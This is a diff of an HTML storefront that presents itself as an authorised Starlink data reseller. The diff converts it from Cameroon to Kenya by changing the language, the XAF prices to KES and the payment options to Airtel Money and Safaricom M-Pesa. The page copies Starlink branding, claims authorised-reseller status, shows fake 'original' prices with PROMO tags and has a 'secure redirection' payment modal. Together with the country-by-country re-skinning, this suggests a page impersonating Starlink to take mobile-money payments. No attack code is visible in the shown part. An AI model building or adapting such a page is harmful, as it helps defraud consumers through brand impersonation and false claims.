@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="page-title">Forfaits - Starlink</title>
-    <meta name="cache-version" content="v12-ethiopia">
+    <title id="page-title">Packages - Starlink Kenya</title>
+    <meta name="cache-version" content="v13-kenya">
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
     <link rel="manifest" href="/starlink/manifest.json">
     <meta name="theme-color" content="#000000">
@@ -44,7 +44,7 @@
         .payment-option { display: flex; align-items: center; gap: 16px; padding: 16px; border: 2px solid #e5e7eb; border-radius: 12px; cursor: pointer; transition: all 0.2s; }
         .payment-option:hover { border-color: #d1d5db; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
         .payment-option.airtel:hover { border-color: #ed1c24; background: #fef2f2; }
-        .payment-option.moov:hover { border-color: #f5a623; background: #fff8eb; }
+        .payment-option.safaricom:hover { border-color: #0066B2; background: #e6f3ff; }
         .payment-option.lumitel:hover { border-color: #f5a623; background: #fff8eb; }
         .payment-option.ecocash:hover { border-color: #0066B2; background: #e6f3ff; }
         .payment-option.orange:hover { border-color: #FF6600; background: #fff5eb; }
@@ -53,6 +53,7 @@
         .payment-option.kbzpay:hover { border-color: #0060AF; background: #e8f2ff; }
         .payment-logo { width: 50px; height: 50px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 10px; color: white; }
         .payment-logo.airtel { background: #ed1c24; }
+        .payment-logo.safaricom { background: #0066B2; font-size: 10px; }
         .payment-logo.moov { background: #f5a623; font-size: 9px; }
         .payment-logo.lumitel { background: #f5a623; font-size: 8px; }
         .payment-logo.ecocash { background: #0066B2; font-size: 8px; }
@@ -107,12 +108,23 @@
             <p class="payment-modal-subtitle" id="paymentMethodSubtitle">Choose how you want to pay</p>
             
             <div class="payment-options">
-                <!-- MTN Mobile Money Option -->
-                <div class="payment-option mtn" id="selectMtn" onclick="selectPaymentMethod('mtn')">
-                    <div class="payment-logo mtn" style="background:#ffcc00;color:#000;font-weight:800;font-size:13px;display:flex;align-items:center;justify-content:center;">MTN</div>
+                <!-- Airtel Money Option -->
+                <div class="payment-option airtel" id="selectAirtel" onclick="selectPaymentMethod('airtel')">
+                    <div class="payment-logo airtel" style="background:#ed1c24;">Airtel</div>
                     <div class="payment-info">
-                        <h4>MTN Mobile Money</h4>
-                        <p>Pay with MTN MoMo</p>
+                        <h4>Airtel Money</h4>
+                        <p>Pay with Airtel Money</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+                <!-- Safaricom M-Pesa Option -->
+                <div class="payment-option safaricom" id="selectSafaricom" onclick="selectPaymentMethod('safaricom')">
+                    <div class="payment-logo safaricom" style="background:#0066B2;">M-PESA</div>
+                    <div class="payment-info">
+                        <h4>Safaricom M-Pesa</h4>
+                        <p>Pay with M-Pesa</p>
                     </div>
                     <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <path d="M9 18l6-6-6-6"/>
@@ -220,7 +232,7 @@
             <a href="/starlink/" class="flex items-center gap-2">
                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="36" height="36" class="flex-shrink-0"><ellipse cx="100" cy="100" rx="74" ry="55" stroke="white" stroke-width="10" fill="none" transform="rotate(-25 100 100)"/><ellipse cx="100" cy="100" rx="43" ry="33" stroke="white" stroke-width="10" fill="none" transform="rotate(65 100 100)"/><circle cx="100" cy="100" r="12" fill="white"/></svg>
                 <span class="font-bold text-xl sm:text-2xl tracking-widest">STARLINK</span>
-                <span id="header-subtitle" class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Revendeur Cameroun</span>
+                <span id="header-subtitle" class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Reseller Kenya</span>
             </a>
             <div class="flex items-center gap-4">
                 <button id="langToggle" onclick="toggleLanguage()" class="flex items-center gap-1 text-xs font-semibold bg-gray-800 hover:bg-gray-700 text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-full transition">
@@ -257,16 +269,16 @@
                         <i class="uil uil-shopping-bag text-4xl sm:text-5xl text-blue-400"></i>
                     </div>
                 </div>
-                <p id="plans-desc" class="text-gray-400 text-sm">Cliquez sur un forfait pour voir les options de paiement Mobile Money (Airtel, Moov, Lumitel, EcoCash, Orange).</p>
+                <p id="plans-desc" class="text-gray-400 text-sm">Click on a package below, then choose Airtel Money or Safaricom M-Pesa to complete payment.</p>
             </div>
 
             <!-- Package Cards -->
             <div class="space-y-4">
                 <!-- Quotidien Limité -->
                 <div>
-                    <h3 class="text-sm font-semibold text-gray-500 uppercase tracking-wider mb-3">Quotidien Limité</h3>
+                    <h3 class="text-sm font-semibold text-gray-500 uppercase tracking-wider mb-3">Daily Limited</h3>
                     <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
-                    <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-1gb" data-price="100" data-original-price="200">
+                    <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-1gb" data-price="150" data-original-price="300">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-green-100 rounded-xl flex items-center justify-center">
@@ -278,17 +290,17 @@
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">200 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-green-600">100 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">300 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-green-600">150 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/24h</p>
                                 </div>
                             </div>
                             <div class="mt-4 flex flex-wrap gap-2">
                                 <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">1 GB</span>
-                                <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">24 heures</span>
+                                <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">24 hours</span>
                             </div>
                         </div>
-                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-3gb" data-price="250" data-original-price="400">
+                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-3gb" data-price="350" data-original-price="500">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-blue-100 rounded-xl flex items-center justify-center">
@@ -300,8 +312,8 @@
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">400 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-blue-600">250 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">500 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-blue-600">350 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/24h</p>
                                 </div>
                             </div>
@@ -310,7 +322,7 @@
                                 <span class="text-xs bg-blue-100 text-blue-600 px-3 py-1 rounded-full">24 heures</span>
                             </div>
                         </div>
-                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-7gb" data-price="500" data-original-price="800">
+                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-7gb" data-price="600" data-original-price="1000">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-yellow-100 rounded-xl flex items-center justify-center">
@@ -322,8 +334,8 @@
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">800 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-yellow-600">500 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">1000 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-yellow-600">600 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/24h</p>
                                 </div>
                             </div>
@@ -332,7 +344,7 @@
                                 <span class="text-xs bg-yellow-100 text-yellow-600 px-3 py-1 rounded-full">24 heures</span>
                             </div>
                         </div>
-                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-15gb" data-price="800" data-original-price="1200">
+                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-15gb" data-price="1000" data-original-price="1500">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-indigo-100 rounded-xl flex items-center justify-center">
@@ -344,8 +356,8 @@
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">1200 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-indigo-600">800 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">1500 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-indigo-600">1000 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/24h</p>
                                 </div>
                             </div>
@@ -354,20 +366,20 @@
                                 <span class="text-xs bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full">24 heures</span>
                             </div>
                         </div>
-                            <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-30gb" data-price="1200" data-original-price="1800">
+                            <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-30gb" data-price="1500" data-original-price="2200">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-purple-100 rounded-xl flex items-center justify-center">
                                         <i class="uil uil-rocket text-2xl text-purple-600"></i>
                                     </div>
                                     <div>
-                                        <h3 class="font-bold text-lg text-gray-900">30 GB / 7 jours</h3>
+                                        <h3 class="font-bold text-lg text-gray-900">30 GB / 7 days</h3>
                                         <p class="text-gray-500 text-sm">Données limitées</p>
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">1800 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-purple-600">1200 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">2200 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-purple-600">1500 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/7 jours</p>
                                 </div>
                             </div>
@@ -376,20 +388,20 @@
                                 <span class="text-xs bg-purple-100 text-purple-600 px-3 py-1 rounded-full">7 jours</span>
                             </div>
                         </div>
-                            <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-50gb" data-price="1800" data-original-price="2500">
+                            <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-50gb" data-price="2200" data-original-price="3200">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-red-100 rounded-xl flex items-center justify-center">
                                         <i class="uil uil-cloud text-2xl text-red-600"></i>
                                     </div>
                                     <div>
-                                        <h3 class="font-bold text-lg text-gray-900">50 GB / 15 jours</h3>
+                                        <h3 class="font-bold text-lg text-gray-900">50 GB / 15 days</h3>
                                         <p class="text-gray-500 text-sm">Données limitées</p>
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">2500 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-red-600">1800 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">3200 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-red-600">2200 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/15 jours</p>
                                 </div>
                             </div>
@@ -403,22 +415,22 @@
 
                 <!-- Illimité -->
                 <div>
-                    <h3 class="text-sm font-semibold text-gray-500 uppercase tracking-wider mb-3">Illimité</h3>
+                    <h3 class="text-sm font-semibold text-gray-500 uppercase tracking-wider mb-3">Unlimited</h3>
                     <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
-                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-orange-200 relative" data-package="daily-unlimited" data-price="1000" data-original-price="1500">
+                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-orange-200 relative" data-package="daily-unlimited" data-price="1200" data-original-price="1800">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-gradient-to-br from-orange-400 to-orange-500 rounded-xl flex items-center justify-center">
                                         <i class="uil uil-star text-2xl text-white"></i>
                                     </div>
                                     <div>
-                                        <h3 class="font-bold text-lg text-gray-900">Illimité / 3 jours</h3>
-                                        <p class="text-gray-500 text-sm">Données illimitées</p>
+                                        <h3 class="font-bold text-lg text-gray-900">Unlimited / 3 days</h3>
+                                        <p class="text-gray-500 text-sm">Unlimited data</p>
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">1500 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-orange-500">1000 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">1800 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-orange-500">1200 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/3 jours</p>
                                 </div>
                             </div>
@@ -427,20 +439,20 @@
                                 <span class="text-xs bg-orange-100 text-orange-600 px-3 py-1 rounded-full">3 jours</span>
                             </div>
                         </div>
-                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-orange-200 relative" data-package="weekly-unlimited" data-price="2000" data-original-price="3000">
+                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-orange-200 relative" data-package="weekly-unlimited" data-price="2500" data-original-price="3500">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-gradient-to-br from-orange-400 to-orange-500 rounded-xl flex items-center justify-center">
                                         <i class="uil uil-star text-2xl text-white"></i>
                                     </div>
                                     <div>
-                                        <h3 class="font-bold text-lg text-gray-900">Illimité / 7 jours</h3>
-                                        <p class="text-gray-500 text-sm">Données illimitées</p>
+                                        <h3 class="font-bold text-lg text-gray-900">Unlimited / 7 days</h3>
+                                        <p class="text-gray-500 text-sm">Unlimited data</p>
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">3000 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-orange-500">2000 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">3500 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-orange-500">2500 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/7 jours</p>
                                 </div>
                             </div>
@@ -449,20 +461,20 @@
                                 <span class="text-xs bg-orange-100 text-orange-600 px-3 py-1 rounded-full">7 jours</span>
                             </div>
                         </div>
-                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-orange-200 relative" data-package="monthly-unlimited" data-price="5000" data-original-price="8000">
+                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-orange-200 relative" data-package="monthly-unlimited" data-price="6000" data-original-price="9000">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-xl flex items-center justify-center">
                                         <i class="uil uil-star text-2xl text-white"></i>
                                     </div>
                                     <div>
-                                        <h3 class="font-bold text-lg text-gray-900">Illimité / 1 mois</h3>
-                                        <p class="text-gray-500 text-sm">Données illimitées</p>
+                                        <h3 class="font-bold text-lg text-gray-900">Unlimited / 1 month</h3>
+                                        <p class="text-gray-500 text-sm">Unlimited data</p>
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">8000 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-orange-500">5000 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">9000 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-orange-500">6000 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/1 mois</p>
                                 </div>
                             </div>
@@ -476,9 +488,9 @@
 
                 <!-- Mensuel Limité -->
                 <div>
-                    <h3 class="text-sm font-semibold text-gray-500 uppercase tracking-wider mb-3">Mensuel Limité</h3>
+                    <h3 class="text-sm font-semibold text-gray-500 uppercase tracking-wider mb-3">Monthly Limited</h3>
                     <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
-                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="monthly-10gb" data-price="1000" data-original-price="1500">
+                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="monthly-10gb" data-price="1200" data-original-price="1800">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-green-100 rounded-xl flex items-center justify-center">
@@ -490,8 +502,8 @@
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">1500 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-green-600">1000 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">1800 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-green-600">1200 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/1 mois</p>
                                 </div>
                             </div>
@@ -500,7 +512,7 @@
                                 <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">30 jours</span>
                             </div>
                         </div>
-                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="monthly-50gb" data-price="2500" data-original-price="4000">
+                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="monthly-50gb" data-price="3000" data-original-price="4500">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-blue-100 rounded-xl flex items-center justify-center">
@@ -512,8 +524,8 @@
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">4000 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-blue-600">2500 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">4500 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-blue-600">3000 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/1 mois</p>
                                 </div>
                             </div>
@@ -522,7 +534,7 @@
                                 <span class="text-xs bg-blue-100 text-blue-600 px-3 py-1 rounded-full">30 jours</span>
                             </div>
                         </div>
-                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="monthly-100gb" data-price="4000" data-original-price="6000">
+                        <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="monthly-100gb" data-price="4800" data-original-price="7000">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
                                     <div class="w-14 h-14 bg-purple-100 rounded-xl flex items-center justify-center">
@@ -534,8 +546,8 @@
                                     </div>
                                 </div>
                                 <div class="text-right">
-                                    <p class="pkg-original-price">6000 XAF</p>
-                                    <p class="pkg-price text-2xl font-black text-purple-600">4000 XAF <span class="promo-tag">PROMO</span></p>
+                                    <p class="pkg-original-price">7000 KES</p>
+                                    <p class="pkg-price text-2xl font-black text-purple-600">4800 KES <span class="promo-tag">PROMO</span></p>
                                     <p class="text-xs text-gray-500">/1 mois</p>
                                 </div>
                             </div>
@@ -552,8 +564,8 @@
                 <div class="flex items-start gap-3">
                     <i class="uil uil-info-circle text-blue-600 text-xl mt-0.5"></i>
                     <div>
-                        <h4 id="payment-info-title" class="font-bold text-gray-900 mb-1">Paiement via MTN Mobile Money</h4>
-                        <p id="payment-info-desc" class="text-sm text-gray-600">Cliquez d'abord sur un forfait ci-dessus, puis choisissez MTN Mobile Money pour finaliser le paiement.</p>
+                        <h4 id="payment-info-title" class="font-bold text-gray-900 mb-1">Payment via Airtel Money or Safaricom M-Pesa</h4>
+                        <p id="payment-info-desc" class="text-sm text-gray-600">Click on a package above, then choose Airtel Money or Safaricom M-Pesa to complete payment.</p>
                     </div>
                 </div>
             </div>
@@ -639,9 +651,9 @@
             // No auth required — allow all users to browse packages freely
         })();
 
-        // Country configurations - Cameroon only
+        // Country configurations - Kenya only
         const COUNTRY_CONFIG = {
-            'CM': { name: 'Cameroun', lang: 'fr', currency: 'XAF', rate: 1 }
+            'KE': { name: 'Kenya', lang: 'en', currency: 'KES', rate: 1 }
         };
 
         function openAgentModal() {
@@ -798,25 +810,15 @@
 
         // ── Translations ──
         const translations = {
-            fr: {
-                modalSubtitle: 'Redirection sécurisée vers la passerelle de paiement MTN Mobile Money',
-                paymentInfoTitle: 'Paiement via MTN Mobile Money',
-                paymentInfoDesc: 'Cliquez d\'abord sur un forfait ci-dessus, puis choisissez MTN Mobile Money pour finaliser le paiement.',
-                plansDesc: 'Sélectionnez un forfait quotidien ou mensuel et payez via MTN Mobile Money pour activer immédiatement.',
-                footerDesc: 'Revendeur agréé de forfaits de données pour les services Starlink. Paiements rapides, fiables et sécurisés via MTN Mobile Money.',
-                footerSupport: 'Disponible 24h/24, 7j/7 pour l\'assistance technique.',
-                footerPayment: 'Payez en toute sécurité avec MTN Mobile Money. Assurez-vous d\'avoir un solde suffisant pour le forfait sélectionné.',
-                footerCopyright: '© 2026 Starlink Reseller Cameroun. Tous droits réservés.'
-            },
             en: {
-                modalSubtitle: 'Secure redirection to the MTN Mobile Money payment gateway',
-                paymentInfoTitle: 'Payment via MTN Mobile Money',
-                paymentInfoDesc: 'First click on a package above, then choose MTN Mobile Money to complete payment.',
-                plansDesc: 'Select a daily or monthly package and pay via MTN Mobile Money to activate immediately.',
-                footerDesc: 'Authorized reseller of data packages for Starlink services. Fast, reliable and secure payments via MTN Mobile Money.',
+                modalSubtitle: 'Secure redirection to the Airtel Money or Safaricom M-Pesa payment gateway',
+                paymentInfoTitle: 'Payment via Airtel Money or Safaricom M-Pesa',
+                paymentInfoDesc: 'First click on a package above, then choose Airtel Money or Safaricom M-Pesa to complete payment.',
+                plansDesc: 'Select a daily or monthly package and pay via Airtel Money or Safaricom M-Pesa to activate immediately.',
+                footerDesc: 'Authorized reseller of data packages for Starlink services. Fast, reliable and secure payments via Airtel Money and Safaricom M-Pesa.',
                 footerSupport: 'Available 24/7 for technical support.',
-                footerPayment: 'Pay securely with MTN Mobile Money. Make sure you have sufficient balance for the selected package.',
-                footerCopyright: '© 2026 Starlink Reseller Cameroon. All rights reserved.'
+                footerPayment: 'Pay securely with Airtel Money or Safaricom M-Pesa. Make sure you have sufficient balance for the selected package.',
+                footerCopyright: '© 2026 Starlink Reseller Kenya. All rights reserved.'
             }
         };
 
@@ -900,18 +902,18 @@
             const selectedCard = document.querySelector('.package-card.selected');
             const packagePrice = selectedCard ? selectedCard.getAttribute('data-price') : '0';
 
-            if (method === 'orange') {
-                loadingLogo.innerHTML = '<span style="font-size:11px;">Orange</span>';
-                loadingLogo.style.background = '#FF6600';
-                modalSubtitle.textContent = currentLang === 'fr' ? 'Redirection sécurisée vers la passerelle de paiement Orange Money' : 'Secure redirection to the Orange Money payment gateway';
-            } else if (method === 'mtn') {
-                loadingLogo.innerHTML = '<span style="font-size:11px;color:#000;">MTN</span>';
-                loadingLogo.style.background = '#ffcc00';
-                modalSubtitle.textContent = currentLang === 'fr' ? 'Redirection sécurisée vers la passerelle de paiement MTN Mobile Money' : 'Secure redirection to the MTN Mobile Money payment gateway';
+            if (method === 'airtel') {
+                loadingLogo.innerHTML = '<span style="font-size:11px;">Airtel</span>';
+                loadingLogo.style.background = '#ed1c24';
+                modalSubtitle.textContent = currentLang === 'fr' ? 'Redirection sécurisée vers la passerelle de paiement Airtel Money' : 'Secure redirection to the Airtel Money payment gateway';
+            } else if (method === 'safaricom') {
+                loadingLogo.innerHTML = '<span style="font-size:11px;color:#000;">M-PESA</span>';
+                loadingLogo.style.background = '#0066B2';
+                modalSubtitle.textContent = currentLang === 'fr' ? 'Redirection sécurisée vers la passerelle de paiement Safaricom M-Pesa' : 'Secure redirection to the Safaricom M-Pesa payment gateway';
             } else {
                 loadingLogo.innerHTML = '<span>airtel</span>';
                 loadingLogo.style.background = '#ed1c24';
-                modalSubtitle.textContent = t.modalSubtitle || 'Secure redirection to the MTN Mobile Money payment gateway';
+                modalSubtitle.textContent = t.modalSubtitle || 'Secure redirection to the Airtel Money payment gateway';
             }
 
             loadingModal.classList.add('active');
